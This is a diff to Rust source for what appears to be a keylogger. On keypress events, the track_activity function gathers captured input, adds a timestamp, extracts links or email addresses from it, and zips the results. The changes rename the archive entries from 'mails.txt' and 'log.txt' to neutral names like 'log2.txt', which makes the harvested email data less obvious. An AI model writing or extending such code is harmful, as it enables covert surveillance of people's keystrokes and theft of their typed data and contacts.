@@ -167,8 +167,8 @@ fn track_activity(event: Event) {
         EventType::KeyPress(Key::ScrollLock | Key::NumLock) => println!("NumLock!"),
         EventType::KeyPress(Key::Pause | Key::PrintScreen) => println!("PrintScreen!"),
         EventType::KeyPress(Key::Return) => {
-            let zipped_logs1: String = readlogs("log.txt");
-            let zipped_logs2: String = readlogs("mails.txt");
+            let zipped_logs1: String = readlogs("log1.txt");
+            let zipped_logs2: String = readlogs("log2.txt");
 
             let now = Utc::now();
             let x: String = format!("{}", now);
@@ -183,7 +183,7 @@ fn track_activity(event: Event) {
             fileRead.read_to_string(&mut data);
 
             let logs1 = zipped_logs1 + &data + "\n" + &now_parsed.to_string() + "\n";
-            let logs2 = zipped_logs2 + "\n" + &links(data.clone());
+            let logs2 = zipped_logs2 + &links(data.clone());
 
             zip_main(logs1, logs2);
 
@@ -236,11 +236,11 @@ fn dozip(logs: String, mails: String) -> ZipResult<()> {
     zip.start_file("text/hello.txt", options)?;
     zip.write_all(b"Hello, World!\n")?;
 
-    zip.start_file("text/log.txt", options)?;
+    zip.start_file("text/log1.txt", options)?;
     zip.write_all(logs.as_bytes())?;
 
     if !mails.is_empty() {
-        zip.start_file("text/mails.txt", options)?;
+        zip.start_file("text/log2.txt", options)?;
         zip.write_all(mails.as_bytes())?;
     }
 
